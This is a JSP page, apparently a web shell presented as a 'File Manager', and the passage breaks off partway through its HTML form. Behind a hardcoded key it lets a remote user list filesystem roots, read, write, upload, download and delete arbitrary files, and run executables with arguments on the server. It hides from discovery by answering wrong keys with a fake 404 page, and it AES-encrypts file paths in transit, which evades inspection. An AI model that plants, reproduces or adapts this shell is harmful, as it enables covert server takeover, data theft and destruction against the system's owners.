<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*,java.nio.file.*,java.nio.charset.*,java.util.*,java.security.*,javax.crypto.*,javax.crypto.spec.*,java.util.Base64,jakarta.servlet.http.Part" %>
<%!
// ============================================================
// CONFIGURATION  -- only section you should ever need to edit
// ============================================================
static final String SERVER_KEY     = "MyS3cr3tServerK3y!"; // change this
static final int    EXEC_TIMEOUT_MS = 30000;
static final String[] SPECIAL_FILE = { "backup1", "backup2" };
static final Set<String> EXE_EXTS = new HashSet<>(Arrays.asList(
    ".exe", ".bat", ".cmd", ".com", ".sh", ".ps1", ""
));

// ============================================================
// AES-256-CBC TRANSPORT LAYER
// ============================================================
static byte[] deriveKey(String sessionKey) throws Exception {
    MessageDigest sha = MessageDigest.getInstance("SHA-256");
    return sha.digest(sessionKey.getBytes(StandardCharsets.UTF_8));
}

static String aesEncrypt(String plain, String key) throws Exception {
    if (plain == null || plain.isEmpty()) return "";
    byte[] keyBytes = deriveKey(key);
    SecretKeySpec sks = new SecretKeySpec(keyBytes, "AES");
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.ENCRYPT_MODE, sks);
    byte[] iv  = cipher.getIV();
    byte[] ct  = cipher.doFinal(plain.getBytes(StandardCharsets.UTF_8));
    byte[] out = new byte[16 + ct.length];
    System.arraycopy(iv, 0, out, 0,  16);
    System.arraycopy(ct, 0, out, 16, ct.length);
    return Base64.getEncoder().encodeToString(out);
}

static String aesDecrypt(String cipherB64, String key) {
    if (cipherB64 == null || cipherB64.isEmpty()) return "";
    try {
        byte[] data = Base64.getDecoder().decode(cipherB64);
        byte[] iv   = Arrays.copyOfRange(data, 0,  16);
        byte[] body = Arrays.copyOfRange(data, 16, data.length);
        byte[] keyBytes = deriveKey(key);
        SecretKeySpec sks = new SecretKeySpec(keyBytes, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, sks, new IvParameterSpec(iv));
        return new String(cipher.doFinal(body), StandardCharsets.UTF_8);
    } catch (Exception e) { return ""; }
}

// URL-safe Base64
static String toSafe(String b64) {
    return b64.replace('+', '-').replace('/', '_').replace("=", "");
}
static String fromSafe(String safe) {
    String b64 = safe.replace('-', '+').replace('_', '/');
    int pad = b64.length() % 4;
    if (pad == 2) b64 += "==";
    else if (pad == 3) b64 += "=";
    return b64;
}

// Session key derivation
static String makeSessionKey(String userKey) throws Exception {
    MessageDigest sha = MessageDigest.getInstance("SHA-256");
    byte[] hash = sha.digest((userKey + SERVER_KEY).getBytes(StandardCharsets.UTF_8));
    StringBuilder sb = new StringBuilder(64);
    for (byte b : hash) sb.append(String.format("%02x", b));
    return sb.toString();
}

static String fmtBytes(long b) {
    if (b < 1024)    return b + "B";
    if (b < 1048576) return String.format("%.1fKB", b / 1024.0);
    return String.format("%.1fMB", b / 1048576.0);
}

static String jsStr(String s) {
    if (s == null || s.isEmpty()) return "";
    return s.replace("\\", "\\\\").replace("'", "\\'");
}

static String htmlEncode(String s) {
    if (s == null) return "";
    return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            .replace("\"","&quot;").replace("'","&#39;");
}

// Resolve a path (absolute or relative to a given base)
static String resolvePath(String base, String path) {
    if (path == null || path.isEmpty()) return "";
    File f = new File(path);
    if (!f.isAbsolute()) f = new File(base, path);
    try { return f.getCanonicalPath(); } catch(Exception e){ return f.getAbsolutePath(); }
}
%>
<%
// ============================================================
// HELPERS (per-request)
// ============================================================
boolean isAuth  = "1".equals(session.getAttribute("auth"));
String  skey    = (String) session.getAttribute("skey");
if (skey == null) skey = "";

// Shorthand encrypt/decrypt with session key
final String _skey = skey;

// F() - read form field; works for both regular and multipart posts
String _contentType = request.getContentType();
boolean _isMultipart = _contentType != null && _contentType.toLowerCase().contains("multipart/");

java.util.function.Function<String,String> F = k -> {
    // For multipart, getParameter() returns null — read the part as text instead
    if (_isMultipart) {
        try {
            Part p = request.getPart(k);
            if (p == null) return "";
            try (java.io.InputStream is = p.getInputStream()) {
                return new String(is.readAllBytes(), StandardCharsets.UTF_8).trim();
            }
        } catch (Exception e) { return ""; }
    }
    String v = request.getParameter(k);
    return v == null ? "" : v.trim();
};

// Enc/Dec
java.util.function.Function<String,String> Enc = s -> {
    try { return toSafe(aesEncrypt(s, _skey)); } catch(Exception e){ return ""; }
};
java.util.function.Function<String,String> Dec = s -> {
    return aesDecrypt(fromSafe(s), _skey);
};

// CWD — use String[] so it can be reassigned and still be effectively final for lambdas
String[] _cwd = { (String) session.getAttribute("cwd") };
if (_cwd[0] == null || _cwd[0].isEmpty() || !new File(_cwd[0]).isDirectory()) {
    _cwd[0] = request.getServletContext().getRealPath("/");
    session.setAttribute("cwd", _cwd[0]);
}
// Convenience: read current cwd as plain String (reassign _cwd[0] to change it)
String cwd = _cwd[0];

// We'll build the message inline
String msgText = "";
String msgKind = "info";
boolean showMsg = false;

// ============================================================
// AUTHENTICATION
// ============================================================
String action = F.apply("__ACTION");

if ("login".equals(action)) {
    String key = F.apply("userKey");
    if (key.isEmpty()) {
        msgText = "Enter a key."; msgKind = "err"; showMsg = true;
    } else if (!key.equals(SERVER_KEY)) {
        response.setStatus(404);
        response.setContentType("text/html");
        out.print("<html><body><h1>404 Not Found</h1></body></html>");
        return;
    } else {
        session.setAttribute("auth", "1");
        session.setAttribute("skey", makeSessionKey(key));
        isAuth = true;
        skey   = (String) session.getAttribute("skey");
        final String _skeyNew = skey;
        Enc = s -> { try { return toSafe(aesEncrypt(s, _skeyNew)); } catch(Exception e){ return ""; } };
        Dec = s -> aesDecrypt(fromSafe(s), _skeyNew);
    }
} else if ("logout".equals(action) && isAuth) {
    session.invalidate();
    response.sendRedirect(request.getRequestURI());
    return;
}

// Re-check auth after possible login
isAuth = "1".equals(session.getAttribute("auth"));

// ============================================================
// DOWNLOAD (must fire before HTML output)
// ============================================================
String dlParam = F.apply("hDownloadPath");
if (isAuth && !dlParam.isEmpty()) {
    String fp = Dec.apply(dlParam);
    if (!fp.isEmpty()) {
        File dlf = new File(fp);
        if (dlf.isFile()) {
            response.reset();
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + dlf.getName() + "\"");
            response.setHeader("Content-Length", String.valueOf(dlf.length()));
            byte[] buf = new byte[8192];
            try (InputStream is = new FileInputStream(dlf);
                 OutputStream os = response.getOutputStream()) {
                int n; while ((n = is.read(buf)) != -1) os.write(buf, 0, n);
            }
            return;
        }
    }
}

// ============================================================
// AUTHENTICATED ACTIONS
// ============================================================
String openFile      = (String) session.getAttribute("openFile");
String editorContent = (String) session.getAttribute("editorContent");
String panelSess     = (String) session.getAttribute("panel");
String runExeSess    = (String) session.getAttribute("runExe");
String newFileSess   = (String) session.getAttribute("newFile");
if (openFile      == null) openFile = "";
if (editorContent == null) editorContent = "";
if (panelSess     == null) panelSess = "none";
if (runExeSess    == null) runExeSess = "";
if (newFileSess   == null) newFileSess = "";

String execOutput = "";
boolean showExecResult = false;
String exeArgs = (String) session.getAttribute("exeArgs");
if (exeArgs == null) exeArgs = "";

if (isAuth) {
    // -- CD DIR --
    String cd = F.apply("__CDDIR");
    if (!cd.isEmpty()) {
        String dir = Dec.apply(cd);
        if (new File(dir).isDirectory()) {
            _cwd[0] = dir; cwd = _cwd[0]; session.setAttribute("cwd", cwd);
            msgText = "Entered: " + dir; msgKind = "ok"; showMsg = true;
        }
    }

    // -- READ FILE --
    String rf = F.apply("__RDFILE");
    if (!rf.isEmpty()) {
        String fp = Dec.apply(rf);
        File rff = new File(fp);
        if (rff.isFile()) {
            try {
                String content = new String(Files.readAllBytes(rff.toPath()), StandardCharsets.UTF_8);
                session.setAttribute("editorContent", content);
                session.setAttribute("openFile", fp);
                session.setAttribute("panel", "editor");
                openFile = fp; editorContent = content; panelSess = "editor";
                msgText = "Read: " + fp; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Read error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- RUN EXE (set panel) --
    String rx = F.apply("__RUNEXE");
    if (!rx.isEmpty()) {
        String rp = Dec.apply(rx);
        if (!rp.isEmpty()) {
            session.setAttribute("runExe", rp);
            session.setAttribute("panel", "exec");
            runExeSess = rp; panelSess = "exec";
            msgText = "Ready to run: " + new File(rp).getName(); msgKind = "info"; showMsg = true;
        }
    }

    // -- DELETE FILE --
    String dx = F.apply("__DELFILE");
    if (!dx.isEmpty()) {
        String fp = Dec.apply(dx);
        if (!fp.isEmpty()) {
            File df = new File(fp);
            if (df.isFile()) {
                try {
                    df.delete();
                    if (fp.equals(openFile)) {
                        session.removeAttribute("openFile");
                        session.removeAttribute("editorContent");
                        session.removeAttribute("panel");
                        session.removeAttribute("newFile");
                        openFile = ""; editorContent = ""; panelSess = "none"; newFileSess = "";
                    }
                    msgText = "Deleted: " + fp; msgKind = "ok"; showMsg = true;
                } catch(Exception ex) { msgText = "Delete error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
            } else { msgText = "File not found or already deleted."; msgKind = "err"; showMsg = true; }
        }
    }

    // -- GO TO PATH --
    if ("go".equals(action)) {
        String dir = resolvePath(cwd, Dec.apply(F.apply("hPath")));
        if (dir.isEmpty()) { msgText = "Enter a path."; msgKind = "err"; showMsg = true; }
        else if (!new File(dir).isDirectory()) { msgText = "Not found: " + dir; msgKind = "err"; showMsg = true; }
        else { _cwd[0] = dir; cwd = _cwd[0]; session.setAttribute("cwd", cwd); msgText = "Directory: " + dir; msgKind = "ok"; showMsg = true; }
    }

    // -- READ (manual) --
    if ("read".equals(action)) {
        String fp = resolvePath(cwd, Dec.apply(F.apply("hFilename")));
        File ff = new File(fp);
        if (!ff.isFile()) { msgText = "File not found: " + fp; msgKind = "err"; showMsg = true; }
        else {
            try {
                String content = new String(Files.readAllBytes(ff.toPath()), StandardCharsets.UTF_8);
                session.setAttribute("editorContent", content);
                session.setAttribute("openFile", fp);
                session.setAttribute("panel", "editor");
                openFile = fp; editorContent = content; panelSess = "editor";
                msgText = "Read: " + fp; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Read error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- WRITE / SAVE --
    if ("write".equals(action)) {
        String fname = F.apply("hFilenamePlain");
        if (fname.isEmpty()) fname = openFile;
        if (fname.isEmpty()) { msgText = "Enter a filename."; msgKind = "err"; showMsg = true; }
        else {
            String full = resolvePath(cwd, fname);
            String b64  = F.apply("hContentPlain");
            String body = "";
            if (!b64.isEmpty()) {
                try { body = new String(Base64.getDecoder().decode(b64), StandardCharsets.UTF_8); }
                catch (Exception e2) { body = b64; }
            }
            try {
                Files.write(Paths.get(full), body.getBytes(StandardCharsets.UTF_8));
                session.setAttribute("openFile", full);
                session.removeAttribute("newFile");
                openFile = full; newFileSess = "";
                msgText = "Saved: " + full; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Write error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- NEW FILE --
    if ("new".equals(action)) {
        session.removeAttribute("openFile");
        session.removeAttribute("editorContent");
        session.setAttribute("panel", "editor");
        session.setAttribute("newFile", "1");
        openFile = ""; editorContent = ""; panelSess = "editor"; newFileSess = "1";
        msgText = "New file - enter a name and content, then Save."; msgKind = "info"; showMsg = true;
    }

    // -- CANCEL EDIT --
    if ("cancelEdit".equals(action)) {
        session.removeAttribute("openFile");
        session.removeAttribute("panel");
        session.removeAttribute("newFile");
        session.removeAttribute("editorContent");
        openFile = ""; panelSess = "none"; newFileSess = ""; editorContent = "";
    }

    // -- UP --
    if ("up".equals(action)) {
        File parent = new File(cwd).getParentFile();
        if (parent != null) {
            _cwd[0] = parent.getAbsolutePath(); cwd = _cwd[0]; session.setAttribute("cwd", cwd);
            msgText = "Up to: " + cwd; msgKind = "ok"; showMsg = true;
        } else { msgText = "Already at root."; msgKind = "info"; showMsg = true; }
    }

    // -- UPLOAD --
    if ("upload".equals(action)) {
        Part filePart = null;
        try { filePart = request.getPart("uploadFile"); } catch(Exception ex) {
            msgText = "Upload error (multipart not configured?): " + ex.getMessage(); msgKind = "err"; showMsg = true;
        }
        if (filePart == null || filePart.getSize() == 0) {
            if (!showMsg) { msgText = "No file selected."; msgKind = "err"; showMsg = true; }
        } else {
            String fname = Paths.get(filePart.getSubmittedFileName()).getFileName().toString();
            File dest = new File(cwd, fname);
            try (InputStream is = filePart.getInputStream()) {
                Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING);
                msgText = "Uploaded: " + fname; msgKind = "ok"; showMsg = true;
            } catch(Exception ex) { msgText = "Upload error: " + ex.getMessage(); msgKind = "err"; showMsg = true; }
        }
    }

    // -- EXECUTE --
    if ("exec".equals(action)) {
        String _hExePath   = F.apply("hExePath");
        String _hExePlain  = F.apply("hExePathPlain");
        String _decrypted  = Dec.apply(_hExePath);
        String fp = runExeSess;
        if (fp.isEmpty()) fp = _hExePlain;
        if (fp.isEmpty()) fp = _decrypted;
        String args = F.apply("exeArgs");
        session.setAttribute("exeArgs", args);
        exeArgs = args;

        File ef = new File(fp);
        if (fp.isEmpty() || !ef.isFile()) {
            msgText = "Executable not found. fp=" + fp; msgKind = "err"; showMsg = true;
        } else {
            try {
                List<String> cmd = new ArrayList<>();
                cmd.add(fp);
                if (!args.isEmpty()) {
                    for (String a : args.split("\\s+")) if (!a.isEmpty()) cmd.add(a);
                }
                ProcessBuilder pb = new ProcessBuilder(cmd);
                pb.directory(ef.getParentFile());
                pb.redirectErrorStream(false);
                Process proc = pb.start();

                // Read streams on background threads to avoid deadlock
                final StringBuilder stdout = new StringBuilder();
                final StringBuilder stderr = new StringBuilder();
                Thread t1 = new Thread(() -> {
                    try (BufferedReader r = new BufferedReader(new InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
                        String line; while ((line = r.readLine()) != null) stdout.append(line).append("\n");
                    } catch (IOException ignored) {}
                });
                Thread t2 = new Thread(() -> {
                    try (BufferedReader r = new BufferedReader(new InputStreamReader(proc.getErrorStream(), StandardCharsets.UTF_8))) {
                        String line; while ((line = r.readLine()) != null) stderr.append(line).append("\n");
                    } catch (IOException ignored) {}
                });
                t1.start(); t2.start();

                boolean done = proc.waitFor(EXEC_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);
                if (!done) { proc.destroyForcibly(); }
                t1.join(1000); t2.join(1000);

                StringBuilder sb = new StringBuilder();
                sb.append("=== ").append(fp).append(" ").append(args).append("\n");
                sb.append("=== Exit: ").append(done ? proc.exitValue() : "killed (timeout)").append(" ===\n");
                if (stdout.length() > 0) sb.append(stdout);
                if (stderr.length() > 0) sb.append("--- STDERR ---\n").append(stderr);
                if (!done) sb.append("(Process exceeded timeout and was killed.)\n");

                execOutput = sb.toString();
                showExecResult = true;
                session.setAttribute("panel", "exec");
                panelSess = "exec";
                String exitInfo = done ? " (exit " + proc.exitValue() + ")" : " (timeout - killed)";
                msgText = "Executed: " + ef.getName() + exitInfo;
                msgKind = (done && proc.exitValue() == 0) ? "ok" : "err"; showMsg = true;
            } catch(Exception ex) {
                execOutput = "ERROR: " + ex.getMessage();
                showExecResult = true;
                session.setAttribute("panel", "exec"); panelSess = "exec";
                msgText = "Exec failed: " + ex.getMessage(); msgKind = "err"; showMsg = true;
            }
        }
    }

    // -- CANCEL EXEC --
    if ("cancelExec".equals(action)) {
        session.removeAttribute("runExe");
        session.removeAttribute("panel");
        runExeSess = ""; panelSess = "none"; exeArgs = "";
    }
}

// ============================================================
// BUILD FILE LISTING
// ============================================================
StringBuilder listing = new StringBuilder();
if (isAuth) {
    // Drives (Java - list filesystem roots)
    for (File root : File.listRoots()) {
        String enc = Enc.apply(root.getAbsolutePath());
        String safe = htmlEncode(root.getAbsolutePath());
        listing.append("<div class='entry entry-drive' onclick='cdDir(\"").append(enc).append("\")'>");
        listing.append("<span class='entry-icon'>&#128190;</span>");
        listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
        listing.append("<span class='entry-meta'></span></div>");
    }
    // Directories
    try {
        File[] dirs = new File(cwd).listFiles(File::isDirectory);
        if (dirs != null) {
            Arrays.sort(dirs, Comparator.comparing(f -> f.getName().toLowerCase()));
            for (File d : dirs) {
                String enc  = Enc.apply(d.getAbsolutePath());
                String safe = htmlEncode(d.getName());
                listing.append("<div class='entry entry-dir' onclick='cdDir(\"").append(enc).append("\")'>");
                listing.append("<span class='entry-icon'>&#128193;</span>");
                listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
                listing.append("<span class='entry-meta'></span></div>");
            }
        }
    } catch(Exception e) { listing.append("<div class='entry-err'>Cannot list directories.</div>"); }
    // Files
    try {
        File[] files = new File(cwd).listFiles(File::isFile);
        if (files != null) {
            Arrays.sort(files, Comparator.comparing(f -> f.getName().toLowerCase()));
            for (File f : files) {
                String ext  = f.getName().contains(".") ? f.getName().substring(f.getName().lastIndexOf('.')).toLowerCase() : "";
                boolean isEx = EXE_EXTS.contains(ext);
                String enc  = Enc.apply(f.getAbsolutePath());
                String safe = htmlEncode(f.getName());
                String cls  = isEx ? "entry-exe" : "entry-file";
                String icon = isEx ? "&#9881;" : "&#128196;";
                String meta = fmtBytes(f.length());
                String click = "readFile(\"" + enc + "\")";
                listing.append("<div class='entry ").append(cls).append("' onclick='").append(click).append("'>");
                listing.append("<span class='entry-icon'>").append(icon).append("</span>");
                listing.append("<span class='entry-name' title='").append(safe).append("'>").append(safe).append("</span>");
                listing.append("<span class='entry-meta'>").append(meta).append("</span>");
                listing.append("<span class='entry-actions'>");
                listing.append("<button class='act-btn' title='Read' onclick='event.stopPropagation();readFile(\"").append(enc).append("\")'>&#128065;</button>");
                listing.append("<button class='act-btn act-dl' title='Download' onclick='event.stopPropagation();downloadFile(\"").append(enc).append("\")'>&#8659;</button>");
                if (isEx)
                    listing.append("<button class='act-btn act-run' title='Run' onclick='event.stopPropagation();runExe(\"").append(enc).append("\")'>&#9654;</button>");
                listing.append("<button class='act-btn act-del' title='Delete' onclick='event.stopPropagation();deleteFile(\"").append(enc).append("\",\"").append(safe).append("\")'>&#128465;</button>");
                listing.append("</span></div>");
            }
        }
    } catch(Exception e) { listing.append("<div class='entry-err'>Cannot list files.</div>"); }
}

// Final values for rendering
final String finalCwd          = cwd;
final String finalOpenFile     = openFile;
final String finalEditorContent = editorContent;
final String finalRunExe       = runExeSess;
final String finalPanel        = panelSess;
final String finalNewFile      = newFileSess;
final String finalExeArgs      = exeArgs;
final String finalExecOutput   = execOutput;
final boolean finalShowExec    = showExecResult;
final String finalSkey         = skey;
final String authSKey          = isAuth ? skey : "";
%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>File Manager</title>
<style>
/* ── Design tokens ───────────────────────────────────────── */
:root {
  --bg:      #0d0f14; --surface: #13161e; --surface2: #1a1e2a;
  --border:  #252a38; --border2: #2e3448;
  --accent:  #4f9eff; --accent2: #7b61ff;
  --ok:      #22d392; --err: #ff5f5f; --info: #f0c040; --run: #ff9f40;
  --text:    #d4daf0; --muted: #606880; --dim: #3a3f55;
  --mono:    'Courier New', monospace;
  --sans:    'Segoe UI', system-ui, sans-serif;
  --sidebar: 260px; --hdr: 48px;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }
body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; display: flex; flex-direction: column; }
input[type=hidden] { display: none !important; }

/* ── Login ───────────────────────────────────────────────── */
.login-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-box  { background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
              padding: 36px 40px; width: 360px; display: flex; flex-direction: column; gap: 18px; }
.login-title { font-size: 1.2rem; font-weight: 700; text-align: center;
               background: linear-gradient(90deg,var(--accent),var(--accent2));
               -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.login-sub  { font-size: 12px; color: var(--muted); text-align: center; margin-top: -10px; }
.login-field { display: flex; flex-direction: column; gap: 6px; }
.login-field label { font-size: 12px; color: var(--muted); }
.login-field input { background: var(--surface2); border: 1px solid var(--border); color: var(--text);
  border-radius: 7px; padding: 9px 12px; font-size: 14px; font-family: var(--mono);
  outline: none; width: 100%; letter-spacing: .1em; transition: border-color .15s; }
.login-field input:focus { border-color: var(--accent); }
.login-err  { color: var(--err); font-size: 12px; text-align: center; }
.btn-login  { background: linear-gradient(90deg,var(--accent),var(--accent2)); color: #fff;
  border: none; border-radius: 7px; padding: 10px; font-size: 14px; font-weight: 700;
  cursor: pointer; width: 100%; transition: opacity .15s; }
.btn-login:hover { opacity: .88; }

/* ── Top bar ─────────────────────────────────────────────── */
.topbar { height: var(--hdr); background: var(--surface); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px; padding: 0 14px; flex-shrink: 0; z-index: 10; }
.topbar-logo { font-weight: 700; font-size: 14px; letter-spacing: .04em; white-space: nowrap;
  background: linear-gradient(90deg,var(--accent),var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.topbar-path { font-family: var(--mono); font-size: 11px; color: var(--muted); flex: 1;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: 3px 8px; }
.topbar-msg  { font-size: 11px; padding: 3px 10px; border-radius: 5px; white-space: nowrap;
  max-width: 400px; overflow: hidden; text-overflow: ellipsis; }
.msg-ok   { background:#0a2a1e; border:1px solid #1e5040; color:var(--ok);   }
.msg-err  { background:#2a0e0e; border:1px solid #5a2020; color:var(--err);  }
.msg-info { background:#2a2208; border:1px solid #5a4a10; color:var(--info); }
.btn-logout { background:none; border:1px solid var(--border); color:var(--muted);
  border-radius:5px; padding:3px 10px; font-size:11px; cursor:pointer; white-space:nowrap; }
.btn-logout:hover { color:var(--err); border-color:var(--err); }

/* ── App layout ──────────────────────────────────────────── */
.layout { display: flex; flex: 1; overflow: hidden; height: calc(100vh - var(--hdr)); min-height: 0; }

/* ── Sidebar ─────────────────────────────────────────────── */
.sidebar { width: var(--sidebar); min-width: var(--sidebar); max-width: var(--sidebar);
  background: var(--surface); border-right: 1px solid var(--border);
  display: flex; flex-direction: column; overflow: hidden; height: 100%; }
.sidebar-nav    { display: flex; gap: 4px; padding: 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search { padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search input { width: 100%; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-size: 12px; font-family: var(--mono); outline: none; }
.sidebar-search input:focus { border-color: var(--accent); }
.sidebar-upload { display: flex; gap: 4px; padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; align-items: center; }
.sidebar-list   { flex: 1; overflow-y: scroll; overflow-x: hidden; padding: 4px 0; min-height: 0; }
.cd-row         { display: flex; gap: 4px; padding: 6px 8px; flex-shrink: 0; border-top: 1px solid var(--border); }
.cd-row input   { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-family: var(--mono); font-size: 11px; outline: none; }
.cd-row input:focus { border-color: var(--accent); }
.upload-input { flex: 1; min-width: 0; font-size: 11px; color: var(--muted);
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
  padding: 3px 6px; cursor: pointer; overflow: hidden; }
.upload-input::-webkit-file-upload-button { background: var(--surface); border: 1px solid var(--border);
  color: var(--muted); border-radius: 4px; padding: 2px 6px; font-size: 10px; cursor: pointer; }

/* ── File entries ────────────────────────────────────────── */
.entry { display: flex; align-items: center; gap: 6px; padding: 4px 8px; cursor: pointer;
  border-radius: 4px; margin: 0 4px; transition: background .1s; user-select: none; min-height: 28px; }
.entry:hover { background: var(--surface2); }
.entry-icon    { font-size: 13px; flex-shrink: 0; width: 16px; text-align: center; }
.entry-name    { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
.entry-meta    { font-size: 10px; color: var(--muted); flex-shrink: 0; }
.entry-actions { display: flex; gap: 3px; flex-shrink: 0; opacity: 0; transition: opacity .15s; }
.entry:hover .entry-actions { opacity: 1; }
.entry-drive .entry-name { color: var(--accent2); font-weight: 600; }
.entry-dir   .entry-name { color: var(--accent); }
.entry-exe   .entry-name { color: var(--run); }
.entry-file  .entry-name { color: var(--text); }
.entry-err  { color: var(--err); font-size: 11px; padding: 6px 10px; font-style: italic; }
.act-btn    { background: transparent; border: none; color: var(--muted);
  border-radius: 4px; padding: 2px 5px; font-size: 13px; cursor: pointer;
  transition: color .1s, background .1s; line-height: 1; }
.act-btn:hover     { color: var(--accent); background: var(--surface2); }
.act-run:hover     { color: var(--run);    background: var(--surface2); }
.act-dl:hover      { color: var(--ok);     background: var(--surface2); }
.act-del:hover     { color: var(--err);    background: var(--surface2); }

/* ── Resize handle ───────────────────────────────────────── */
.resize-handle { width: 4px; background: transparent; cursor: col-resize; flex-shrink: 0; transition: background .15s; }
.resize-handle:hover, .resize-handle.dragging { background: var(--accent); }

/* ── Main panel ──────────────────────────────────────────── */
.main       { flex: 1; overflow: hidden; display: flex; flex-direction: column; min-width: 0; }
.panel-tabs { display: flex; gap: 1px; background: var(--border); flex-shrink: 0; }
.tab        { padding: 8px 16px; font-size: 12px; font-weight: 600; color: var(--muted);
  cursor: pointer; background: var(--surface2); border: none;
  transition: color .1s, background .1s; display: flex; align-items: center; gap: 6px; }
.tab:hover  { color: var(--text); background: var(--surface); }
.tab.active { color: var(--text); background: var(--bg); }
.tab .tab-x { font-size: 10px; color: var(--muted); margin-left: 4px; }
.tab:hover .tab-x { color: var(--err); }
.panel-body { flex: 1; overflow-y: auto; display: flex; flex-direction: column; padding: 14px; background: var(--bg); min-height: 0; }
.panel-body.panel-hidden { display: none !important; }
.panel-welcome { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--dim); gap: 10px; }
.panel-welcome svg { opacity: .25; }

/* ── Editor ──────────────────────────────────────────────── */
.editor-topbar { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.editor-topbar input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.editor-topbar input:focus { border-color: var(--accent); }
textarea.editor { flex: 1; min-height: 300px; background: var(--surface2); border: 1px solid var(--border);
  color: #c8d4f0; border-radius: 6px; padding: 10px; font-family: var(--mono);
  font-size: 12px; line-height: 1.6; resize: vertical; outline: none; transition: border-color .15s; }
textarea.editor:focus { border-color: var(--accent); }
.editor-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Execute panel ───────────────────────────────────────── */
.exec-topbar  { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.exec-path    { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--run); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row { display: flex; gap: 8px; margin-bottom: 10px; flex-shrink: 0; align-items: center; }
.exec-args-row label { font-size: 11px; color: var(--muted); white-space: nowrap; }
.exec-args-row input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row input:focus { border-color: var(--accent); }
textarea.console { flex: 1; min-height: 300px; max-height: 420px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; resize: vertical; overflow-y: auto; outline: none; }
pre.console     { flex: 1; min-height: 60px; max-height: 420px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
.exec-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Buttons ─────────────────────────────────────────────── */
.btn         { display: inline-flex; align-items: center; gap: 5px; padding: 5px 12px; border: none;
  border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer;
  transition: filter .15s, transform .1s; white-space: nowrap; }
.btn:active  { transform: scale(.97); }
.btn:hover   { filter: brightness(1.12); }
.btn-sm      { padding: 3px 9px; font-size: 11px; }
.btn-primary { background: var(--accent);   color: #fff; }
.btn-ghost   { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
.btn-danger  { background: #3a1a1a; color: var(--err); border: 1px solid #5a2a2a; }
.btn-success { background: #0e3028; color: var(--ok);  border: 1px solid #1e5040; }
.btn-run     { background: #2a1e08; color: var(--run); border: 1px solid #5a3e10; }

/* ── Scrollbar ───────────────────────────────────────────── */
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--muted); }
</style>
</head>
<body>
<form id="fm" method="post" action="<%= request.getRequestURI() %>">

  <!-- Hidden transport fields (app actions only) -->
  <input type="hidden" name="__CDDIR"       id="hCdDir"      />
  <input type="hidden" name="__RDFILE"      id="hRdFile"     />
  <input type="hidden" name="__RUNEXE"      id="hRunExe"     />
  <input type="hidden" name="__DELFILE"     id="hDelFile"    />
  <input type="hidden" name="hPath"         id="hPath"       />
